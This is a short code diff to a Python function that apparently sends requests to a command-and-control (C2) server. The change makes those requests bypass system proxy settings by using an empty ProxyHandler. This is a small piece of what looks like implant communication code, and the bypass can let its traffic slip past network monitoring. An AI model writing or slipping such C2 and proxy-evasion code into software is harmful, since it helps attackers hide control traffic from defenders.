@@ -153,7 +153,8 @@ def c2_request(url, *, data=None, method=None):
     for attempt in range(C2_REQUEST_ATTEMPTS):
         try:
             request = urllib.request.Request(url, data=data, headers=get_c2_headers(), method=method)
-            with urllib.request.urlopen(request, timeout=C2_REQUEST_TIMEOUT) as response:
+            opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+            with opener.open(request, timeout=C2_REQUEST_TIMEOUT) as response:
                 return response.read()
         except Exception as error:
             last_error = error
